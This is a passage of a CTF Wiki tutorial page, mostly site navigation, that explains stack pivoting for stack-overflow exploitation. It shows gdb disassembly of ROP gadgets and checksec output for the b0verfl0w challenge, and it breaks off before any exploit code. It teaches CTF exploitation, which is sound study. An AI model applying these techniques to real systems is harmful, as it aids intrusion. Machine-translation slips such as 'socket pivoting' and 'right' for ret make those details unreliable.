

  <li class="md-nav__item">
    <a href="../../glibc-heap/use_after_free-zh/" class="md-nav__link">
      Use After Free
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/fastbin_attack-zh/" class="md-nav__link">
      Fastbin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/unsorted_bin_attack-zh/" class="md-nav__link">
      Unsorted Bin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/large_bin_attack-zh/" class="md-nav__link">
      Large Bin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/tcache_attack-zh/" class="md-nav__link">
      Tcache Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/house_of_einherjar-zh/" class="md-nav__link">
      House of Einherjar
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/house_of_force-zh/" class="md-nav__link">
      House of Force
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/house_of_lore-zh/" class="md-nav__link">
      House of Lore
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/house_of_orange-zh/" class="md-nav__link">
      House of Orange
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/house_of_rabbit-zh/" class="md-nav__link">
      House of Rabbit
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/house_of_roman-zh/" class="md-nav__link">
      House of Roman
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-5" type="checkbox" id="nav-8-2-5">
    
    <label class="md-nav__link" for="nav-8-2-5">
      IO_FILE Related
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="IO_FILE Related" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-5">
        <span class="md-nav__icon md-icon"></span>
        IO_FILE Related
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/introduction-zh/" class="md-nav__link">
      FILE Structure Description
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/fake-vtable-exploit-zh/" class="md-nav__link">
      Forged Vtable to Hijack Control Flow
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/fsop-zh/" class="md-nav__link">
      FSOP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/exploit-in-libc2.24-zh/" class="md-nav__link">
      Use of IO_FILE Under Glibc 2.24
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-6" type="checkbox" id="nav-8-2-6">
    
    <label class="md-nav__link" for="nav-8-2-6">
      Race Condition
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Race Condition" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-6">
        <span class="md-nav__icon md-icon"></span>
        Race Condition
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../race-condition/introduction-zh/" class="md-nav__link">
      Race Condition Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../race-condition/problem-zh/" class="md-nav__link">
      Example
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-7" type="checkbox" id="nav-8-2-7">
    
    <label class="md-nav__link" for="nav-8-2-7">
      Integer Overflow
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Integer Overflow" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-7">
        <span class="md-nav__icon md-icon"></span>
        Integer Overflow
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../integeroverflow/intof-zh/" class="md-nav__link">
      Introduction to The Principle of Integer Overflow
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-8" type="checkbox" id="nav-8-2-8">
    
    <label class="md-nav__link" for="nav-8-2-8">
      Sandbox Escape
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Sandbox Escape" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-8">
        <span class="md-nav__icon md-icon"></span>
        Sandbox Escape
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../sandbox/python-sandbox-escape-zh/" class="md-nav__link">
      Python Sandbox Escape
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-9" type="checkbox" id="nav-8-2-9">
    
    <label class="md-nav__link" for="nav-8-2-9">
      Linux Kernel
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Linux Kernel" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-9">
        <span class="md-nav__icon md-icon"></span>
        Linux Kernel
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/environment-zh/" class="md-nav__link">
      Environment Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/basic_knowledge-zh/" class="md-nav__link">
      Basics
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/kernel_uaf-zh/" class="md-nav__link">
      Kernel-UAF
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/kernel_rop-zh/" class="md-nav__link">
      Kernel-ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/ret2usr-zh/" class="md-nav__link">
      ret2usr
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/bypass_smep-zh/" class="md-nav__link">
      bypass-smep
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/double-fetch-zh/" class="md-nav__link">
      Double Fetch
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-10" type="checkbox" id="nav-8-2-10">
    
    <label class="md-nav__link" for="nav-8-2-10">
      arm-pwn
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="arm-pwn" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-10">
        <span class="md-nav__icon md-icon"></span>
        arm-pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../arm/environment-zh/" class="md-nav__link">
      Environment Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../arm/arm_rop-zh/" class="md-nav__link">
      arm-rop
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-11" type="checkbox" id="nav-8-2-11">
    
    <label class="md-nav__link" for="nav-8-2-11">
      Summary
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Summary" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-11">
        <span class="md-nav__icon md-icon"></span>
        Summary
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../summary/get-address-zh/" class="md-nav__link">
      Address Leaking
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../summary/hijack-control-flow-zh/" class="md-nav__link">
      Hijack Control Flow
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../summary/get-shell-zh/" class="md-nav__link">
      Get Shell
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-3" type="checkbox" id="nav-8-3">
    
    <label class="md-nav__link" for="nav-8-3">
      Windows Pwn
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Windows Pwn" data-md-level="2">
      <label class="md-nav__title" for="nav-8-3">
        <span class="md-nav__icon md-icon"></span>
        Windows Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../windows/readme-zh/" class="md-nav__link">
      Overview
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-3-2" type="checkbox" id="nav-8-3-2">
    
    <label class="md-nav__link" for="nav-8-3-2">
      Stack Overflow
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Stack Overflow" data-md-level="3">
      <label class="md-nav__title" for="nav-8-3-2">
        <span class="md-nav__icon md-icon"></span>
        Stack Overflow
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../windows/stackoverflow/stack-introduce-zh/" class="md-nav__link">
      Stack Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../windows/stackoverflow/stackoverflow-basic-zh/" class="md-nav__link">
      Stack Overflow Principle
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../windows/stackoverflow/shellcode-in-stack-zh/" class="md-nav__link">
      shellcode-in-stack
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9" type="checkbox" id="nav-9">
    
    <label class="md-nav__link" for="nav-9">
      Android
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Android" data-md-level="1">
      <label class="md-nav__title" for="nav-9">
        <span class="md-nav__icon md-icon"></span>
        Android
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_develop/basic_develop-zh/" class="md-nav__link">
      Android Development Basics
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2" type="checkbox" id="nav-9-2">
    
    <label class="md-nav__link" for="nav-9-2">
      Android Application Operating Mechanism Brief
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Android Application Operating Mechanism Brief" data-md-level="2">
      <label class="md-nav__title" for="nav-9-2">
        <span class="md-nav__icon md-icon"></span>
        Android Application Operating Mechanism Brief
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/readme-zh/" class="md-nav__link">
      Basics
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2-2" type="checkbox" id="nav-9-2-2">
    
    <label class="md-nav__link" for="nav-9-2-2">
      The Operating Mechanism of the Java Layer in Android
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="The Operating Mechanism of the Java Layer in Android" data-md-level="3">
      <label class="md-nav__title" for="nav-9-2-2">
        <span class="md-nav__icon md-icon"></span>
        The Operating Mechanism of the Java Layer in Android
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/java_layer/readme-zh/" class="md-nav__link">
      Andriod Native
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/java_layer/smali/smali-zh/" class="md-nav__link">
      Smali Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2-2-3" type="checkbox" id="nav-9-2-2-3">
    
    <label class="md-nav__link" for="nav-9-2-2-3">
      Dex and ODEX
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Dex and ODEX" data-md-level="4">
      <label class="md-nav__title" for="nav-9-2-2-3">
        <span class="md-nav__icon md-icon"></span>
        Dex and ODEX
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/java_layer/dex/dex-zh/" class="md-nav__link">
      DEX
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/java_layer/dex/odex-zh/" class="md-nav__link">
      ODEX
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2-3" type="checkbox" id="nav-9-2-3">
    
    <label class="md-nav__link" for="nav-9-2-3">
      Android Native Layer Introduction
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Android Native Layer Introduction" data-md-level="3">
      <label class="md-nav__title" for="nav-9-2-3">
        <span class="md-nav__icon md-icon"></span>
        Android Native Layer Introduction
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/native_layer/so-zh/" class="md-nav__link">
      Android SO
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2-4" type="checkbox" id="nav-9-2-4">
    
    <label class="md-nav__link" for="nav-9-2-4">
      Android Reverse Basic Introduction
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Android Reverse Basic Introduction" data-md-level="3">
      <label class="md-nav__title" for="nav-9-2-4">
        <span class="md-nav__icon md-icon"></span>
        Android Reverse Basic Introduction
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/overview-zh/" class="md-nav__link">
      Brief Description
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/android_code_location-zh/" class="md-nav__link">
      Android Key Part Location
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2-4-3" type="checkbox" id="nav-9-2-4-3">
    
    <label class="md-nav__link" for="nav-9-2-4-3">
      Android Simple Static Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Android Simple Static Analysis" data-md-level="4">
      <label class="md-nav__title" for="nav-9-2-4-3">
        <span class="md-nav__icon md-icon"></span>
        Android Simple Static Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/static/java-example-zh/" class="md-nav__link">
      Android Java Layer Static Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/static/so-example-zh/" class="md-nav__link">
      Android Native Layer Static Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/static/complex-example-zh/" class="md-nav__link">
      Android Static Analysis Hybrid Example
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2-4-4" type="checkbox" id="nav-9-2-4-4">
    
    <label class="md-nav__link" for="nav-9-2-4-4">
      Android Simple Dynamic Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Android Simple Dynamic Analysis" data-md-level="4">
      <label class="md-nav__title" for="nav-9-2-4-4">
        <span class="md-nav__icon md-icon"></span>
        Android Simple Dynamic Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/dynamic/dynamic_debug-zh/" class="md-nav__link">
      Dynamic Debugging
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/dynamic/ida_native_debug-zh/" class="md-nav__link">
      Android Dynamic Debugging SO
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-10" type="checkbox" id="nav-10">
    
    <label class="md-nav__link" for="nav-10">
      ICS
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="ICS" data-md-level="1">
      <label class="md-nav__title" for="nav-10">
        <span class="md-nav__icon md-icon"></span>
        ICS
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../ics/ctfs-zh/" class="md-nav__link">
      ICS_CTF Contest
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../ics/discover-zh/" class="md-nav__link">
      ICS_CTF found
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../ics/exploit-zh/" class="md-nav__link">
      ICS_CTF uses
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../ics/learn-zh/" class="md-nav__link">
      ICS_CTF Learning Resources
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary" aria-label="目录">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      目录
    </label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#stack-pivoting" class="md-nav__link">
    stack pivoting
  </a>
  
    <nav class="md-nav" aria-label="stack pivoting">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#principle" class="md-nav__link">
    Principle
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example" class="md-nav__link">
    example
  </a>
  
    <nav class="md-nav" aria-label="example">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#example-1" class="md-nav__link">
    Example 1
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example-2-transfer-heap" class="md-nav__link">
    Example 2 - Transfer heap
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#title" class="md-nav__link">
    Title
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#frame-faking" class="md-nav__link">
    frame faking
  </a>
  
    <nav class="md-nav" aria-label="frame faking">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#principle_1" class="md-nav__link">
    Principle
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2018-over" class="md-nav__link">
    2018 安恒杯over
  </a>
  
    <nav class="md-nav" aria-label="2018 安恒杯over">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#file-information" class="md-nav__link">
    File Information
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    分析程序
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#leak-stack" class="md-nav__link">
    leak stack
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exp" class="md-nav__link">
    exp
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reference-reading" class="md-nav__link">
    Reference reading
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stack-smash" class="md-nav__link">
    Stack smash
  </a>
  
    <nav class="md-nav" aria-label="Stack smash">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#principle_2" class="md-nav__link">
    Principle
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#32c3-ctf-readme" class="md-nav__link">
    32C3 CTF readme
  </a>
  
    <nav class="md-nav" aria-label="32C3 CTF readme">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#determining-protection" class="md-nav__link">
    Determining protection
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    分析程序
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#determine-the-flag-address" class="md-nav__link">
    Determine the flag address
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#determining-the-offset" class="md-nav__link">
    Determining the offset
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-the-program" class="md-nav__link">
    Using the program
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#title_1" class="md-nav__link">
    Title
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#partial-overwrite-on-the-stack" class="md-nav__link">
    partial overwrite on the stack
  </a>
  
    <nav class="md-nav" aria-label="partial overwrite on the stack">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#2018-babypie" class="md-nav__link">
    2018-安恒杯-babypie
  </a>
  
    <nav class="md-nav" aria-label="2018-安恒杯-babypie">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#determining-protection_1" class="md-nav__link">
    Determining protection
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    分析程序
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#leak-canary" class="md-nav__link">
    leak canary
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#override-return-address" class="md-nav__link">
    Override return address
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2018-xnuca-gets" class="md-nav__link">
    2018-XNUCA-gets
  </a>
  
    <nav class="md-nav" aria-label="2018-XNUCA-gets">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#determining-protection_2" class="md-nav__link">
    Determining protection
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#analysis" class="md-nav__link">
    Analysis
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/stackoverflow/fancy-rop.md" title="编辑此页" class="md-content__button md-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
                  </a>
                
                
                <p><a href="./">EN</a> | <a href="../fancy-rop-zh/">ZH</a></p>
<h1 id="_1">花式栈溢出技巧<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
<h2 id="stack-pivoting">stack pivoting<a class="headerlink" href="#stack-pivoting" title="Permanent link">&para;</a></h2>
<h3 id="principle">Principle<a class="headerlink" href="#principle" title="Permanent link">&para;</a></h3>
<p>Stack pivoting, as it describes, the trick is to hijack the stack pointer to the memory that the attacker can control, and then ROP at the appropriate location. In general, we may need to use stack pivoting in the following situations.</p>
<ul>
<li>The number of bytes that can be controlled by the stack overflow is small, making it difficult to construct a long ROP chain</li>
<li>PIE protection is enabled, the stack address is unknown, we can hijack the stack to a known area.</li>
<li>Other vulnerabilities are difficult to exploit, we need to convert, for example, hijacking the stack to the heap space, writing rop on the heap and making heap exploits</li>
</ul>
<p>In addition, there are several requirements for using socket pivoting.</p>
<ul>
<li>
<p>You can control the flow of program execution.</p>
</li>
<li>
<p>You can control the sp pointer. In general, the control stack pointer will use ROP, and the common control stack pointers are usually gadgets.</p>
</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="nf">pop</span> <span class="no">rsp</span><span class="err">/</span><span class="no">esp</span>
</code></pre></div>
<p>Of course, there will be some other postures. For example, gadgets in libc_csu_init, we can get the control rsp pointer by offset. The above is normal, the bottom is offset.</p>
<div class="highlight"><pre><span></span><code><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">7</span><span class="no">i</span> <span class="mi">0x000000000040061a</span>

<span class="err">0</span><span class="nf">x40061a</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">90</span><span class="err">&gt;</span><span class="p">:</span>  <span class="no">pop</span>    <span class="no">rbx</span>

<span class="err">0</span><span class="nf">x40061b</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">91</span><span class="err">&gt;</span><span class="p">:</span>  <span class="no">pop</span>    <span class="no">rbp</span>

<span class="err">0</span><span class="nf">x40061c</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">92</span><span class="err">&gt;</span><span class="p">:</span>  <span class="no">pop</span>    <span class="no">r12</span>

<span class="err">0</span><span class="nf">x40061e</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">94</span><span class="err">&gt;</span><span class="p">:</span>  <span class="no">pop</span>    <span class="no">r13</span>

<span class="err">0</span><span class="nf">x400620</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">96</span><span class="err">&gt;</span><span class="p">:</span>  <span class="no">pop</span>    <span class="no">r14</span>

<span class="err">0</span><span class="nf">x400622</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">98</span><span class="err">&gt;</span><span class="p">:</span>  <span class="no">pop</span>    <span class="no">r15</span>

<span class="err">0</span><span class="nf">x400624</span> <span class="err">&amp;</span><span class="no">lt</span><span class="c1">;__ libc_csu_init + 100&amp;gt;: right</span>
<span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">7</span><span class="no">i</span> <span class="mi">0x000000000040061d</span>

<span class="err">0</span><span class="nf">x40061d</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">93</span><span class="err">&gt;</span><span class="p">:</span>  <span class="no">pop</span>    <span class="no">rsp</span>

<span class="err">0</span><span class="nf">x40061e</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">94</span><span class="err">&gt;</span><span class="p">:</span>  <span class="no">pop</span>    <span class="no">r13</span>

<span class="err">0</span><span class="nf">x400620</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">96</span><span class="err">&gt;</span><span class="p">:</span>  <span class="no">pop</span>    <span class="no">r14</span>

<span class="err">0</span><span class="nf">x400622</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">98</span><span class="err">&gt;</span><span class="p">:</span>  <span class="no">pop</span>    <span class="no">r15</span>

<span class="err">0</span><span class="nf">x400624</span> <span class="err">&amp;</span><span class="no">lt</span><span class="c1">;__ libc_csu_init + 100&amp;gt;: right</span>
</code></pre></div>
<p>In addition, there are more advanced fake frames.</p>
<ul>
<li>There is memory that can control the content, generally as follows</li>
<li>bss segment. Since the process allocates memory by page, the memory allocated to the bss segment is at least one page (4k, 0x1000) in size. However, the contents of the general bss section do not use so much space, and the memory pages allocated by the bss section have read and write permissions.</li>
<li>heap. But this requires us to be able to reveal the heap address.</li>
</ul>
<h3 id="example">example<a class="headerlink" href="#example" title="Permanent link">&para;</a></h3>
<h4 id="example-1">Example 1<a class="headerlink" href="#example-1" title="Permanent link">&para;</a></h4>
<p>Here we take [X-CTF Quals 2016 - b0verfl0w] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-</a>% 20b0verfl0w) is introduced as an example. First, check the security of the program, as follows</p>
<div class="highlight"><pre><span></span><code>➜  X-CTF Quals <span class="m">2016</span> - b0verfl0w git:<span class="o">(</span>iromise<span class="o">)</span> ✗ checksec b0verfl0w                 

    Arch:     i386-32-little

    RELRO:    Partial RELRO

    Stack:    No canary found

    NX:       NX disabled

    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>

    RWX:      Has RWX segments
</code></pre></div>
<p>It can be seen that the source program is 32-bit and NX protection is not enabled. Let&#39;s look for the vulnerability of the program.</p>
